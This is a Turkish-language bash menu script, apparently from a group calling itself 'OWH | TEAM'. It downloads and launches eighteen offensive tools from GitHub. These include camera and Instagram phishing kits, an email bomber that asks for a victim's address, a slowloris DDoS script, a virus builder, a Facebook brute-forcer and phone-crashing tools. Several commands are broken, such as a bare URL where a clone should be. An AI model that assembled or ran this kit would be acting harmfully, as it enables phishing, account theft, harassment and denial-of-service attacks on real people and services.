clear
mkdir Tools
clear 
echo -e '\033[32;40;1m 
________________$$$$
 ______________$$____$$
 ______________$$____$$
 ______________$$____$$
 ______________$$____$$
 ______________$$____$$
 __________$$$$$$____$$$$$$
 ________$$____$$____$$____$$$$
 ________$$____$$____$$____$$__$$
 $$$$$$__$$____$$____$$____$$____$$
 $$____$$$$________________$$____$$
 $$______$$______________________$$
 __$$____$$______________________$$
 ___$$$__$$______________________$$
 ____$$__________________________$$
 _____$$$________________________$$
 ______$$______________________$$$
 _______$$$____________________$$
 ________$$____________________$$
 _________$$$________________$$$
 __________$$________________$$
 __________$$$$$$$$$$$$$$$$$$$$
 
🏳️ OWH | TEAM

\033[33;4mCTRL+C:\033[0m exit      

\e[37m[1]\e[36m PEK YAKINDA...     \e[37m[2]\e[36m TEL NO DAN TELEFON ÇÖKERTME				
\e[37m[3]\e[36m PHİSHİNG TOOL                   \e[37m[4]\e[36m SUBSCAN			
\e[37m[5]\e[36m GMAİL BOMBER		  \e[37m[6]\e[36m DDOS ATTACK			
\e[37m[7]\e[36m BİLGİ	          \e[37m[8]\e[36m IP BULMA VE INSTA HESAP ÇALMA		
\e[37m[9]\e[36m IP İNFO ÇIKARTMA	                  \e[37m[10]\e[36m DORKS-EYE
\e[37m[11]\e[36m HACKERPRO                    \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VİRUSCRAFTER                 \e[37m[14]\e[36m INFO-SİTE
\e[37m[15]\e[36m BADMOD	                  \e[37m[16]\e[36m FACEBASH
\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER

'


#Rewix tarafından yapılmıştır.


read -p "🏳️ OWH | TEAM  YUKARIDA BULUNAN NUMARALARDAN BİRİNİ SEÇİN: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

echo -e "\033[47;31;5m 🏳️ OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 5
https://github.com/rewixbaba/RewixHacking.git
cd RewixHacking
pip3 install -r requirements.txt
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
rewixhacking.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
git clone https://github.com/tingirifistik/Enough-Reborn.git
cd Enough-Reborn
pip3 install -r requirements.txt
python3 enough.py

elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "Jepni nje domain p.sh (example.com): " sc
./subscan $sc
       
elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[47;3;35m Ky instalim do tju marre shum kohe\033[0m"
echo -e "\033[47;3;35m Per te ndaluar shtypni Ctrl+C\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "-------------------------"
read -p "Jepni nje adres emaili per te bombarduar: " mail
echo "-------------------------"
php index.php start-bombing $mail

elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[47;3;35m SİSTEME GİRİLİYOR...\033[0m"
sleep 3
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py
echo ""
echo -e "\033[47;3;35m python3 slowloris.py ( site ismi? )\033[0m"

elif [[ $islem == 7 || $islem == 07 ]]; then
clear
echo "SİSTEM 🏳️ OWH | TEAM TARAFINDAN YAPILMIŞTIR KÖTÜ AMAÇLA İÇİN KULLANILMAZ!"
python3 -m webbrowser TELEGRAM: @HicSin
sleep 10
echo "Prisni 10 sekonda"
bash rewixhacking.sh

 
elif [[ $islem == 8 || $islem == 08 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3 
pkg update -y
pkg install -y git python python-pip
git clone https://github.com/perviz19/EchoPhish.git
cd EchoPhish
bash EchoPhish

bash rewixhacking.sh

elif [[ $islem == 9 || $islem == 09 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $islem == 10 || $islem == 010 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $islem == 11 || $islem == 011 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $islem == 12 || $islem == 012 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islem == 13 || $islem == 013 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $islem == 14 || $islem == 014 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $islem == 15 || $islem == 015 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $islem == 16 || $islem == 016 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
git clone https://github.com/fu8uk1/facebash
cd facebash
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $islem == 17 || $islem == 017 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
sleep 3
cd Tools
pkg install git
pkg install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
cd DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $islem == 18 || $islem == 018 ]]; then
clear
echo -e "\033[47;3;35m OWH | TEAM SİSTEME GİRİLİYOR...\033[0m"
echo -e "\033[47;3;35m TOOLU ÇALIŞTIRMAK İÇİN CİHAZINIZ ROTLU MU? (ROOT)\033[0m"
sleep 3
cd Tools
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[47;3;35m shkoni te shfletuesi juaj / ndryshoni përfaqësuesin (sock proxy) në 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
aut

else   
	clear
        echo -e '\033[36;40;1m Keni futur kodin e gabuar'	
	sleep 1
	clear 
	bash rewixhacking.sh
fi
